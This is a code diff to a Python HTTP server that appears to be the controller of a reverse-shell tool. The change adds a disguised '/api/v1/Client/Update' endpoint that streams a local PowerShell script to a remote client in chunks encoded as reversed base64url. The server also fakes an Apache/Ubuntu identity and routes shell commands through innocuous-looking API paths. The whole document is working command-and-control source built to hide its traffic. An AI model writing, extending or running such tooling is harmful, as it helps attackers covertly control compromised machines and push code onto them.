@@ -27,6 +27,7 @@ first_run = True ; wait_for_cmd = False
 neotermcolor.readline_always_safe = True
 chunk_size = 65536
 upload_chunk_buffer = {}
+import_encoded = None ; import_filename = None
 
 banner = r"""
   _   _ _____ _____ ____      ____  _          _ _ 
@@ -139,6 +140,7 @@ class MyServer(BaseHTTPRequestHandler):
         global prompt ; global first_run ; global sudo
         global local_path ; global remote_path ; global command 
         global system, last_prompt, autocomplete_pending
+        global import_encoded ; global import_filename
         self.server_version = "Apache/2.4.18"
         self.sys_version = "(Ubuntu)"
         try:
@@ -187,6 +189,40 @@ class MyServer(BaseHTTPRequestHandler):
                     self.wfile.write(encoded_chunk.encode("utf-8"))
                 except:
                     print(colored(f"[!] Error reading \"{local_path}\" file!", "red"))
+
+            elif self.path.startswith("/api/v1/Client/Update"):
+                try:
+                    chunk_index = 0
+                    if "?" in self.path and "index=" in self.path:
+                        query_string = self.path.split("?", 1)[1]
+                        for query_part in query_string.split("&"):
+                            if query_part.startswith("index="):
+                                chunk_index = int(query_part.split("=", 1)[1])
+                                break
+
+                    if import_encoded is None:
+                        self._set_headers()
+                        self.wfile.write(b"FileChunkDone")
+                        return
+
+                    start = chunk_index * chunk_size
+                    end = start + chunk_size
+                    if start >= len(import_encoded):
+                        encoded_chunk = "FileChunkDone"
+                        print(colored(f"[+] File \"{import_filename}\" imported successfully!", "green"))
+                        import_encoded = None ; import_filename = None
+                    else:
+                        chunk_data = import_encoded[start:end]
+                        is_last = "1" if end >= len(import_encoded) else "0"
+                        encoded_chunk = f"FileChunk:{chunk_index}:{is_last}:{chunk_data}"
+                        if is_last == "1":
+                            print(colored(f"[+] File \"{import_filename}\" imported successfully!", "green"))
+                            import_encoded = None ; import_filename = None
+
+                    self._set_headers()
+                    self.wfile.write(encoded_chunk.encode("utf-8"))
+                except:
+                    print(colored("[!] Error importing file!", "red"))
 
             elif self.path == "/api/v1/Client/Token":
                 if prompt and "\\" in prompt:
@@ -342,8 +378,9 @@ class MyServer(BaseHTTPRequestHandler):
                             try:
                                 filename = args[1]
                                 with open(filename, "rb") as f:
-                                    command = f.read().decode()
-                                    print(colored(f"[!] File \"{filename}\" imported successfully!", "green"))
+                                    import_encoded = self.encode_file_revbase64url(f.read())
+                                import_filename = filename
+                                command = "import-ps1 " + filename
 
                             except FileNotFoundError:
                                 print(colored(f"[!] File \"{filename}\" not found!\n", "red"))
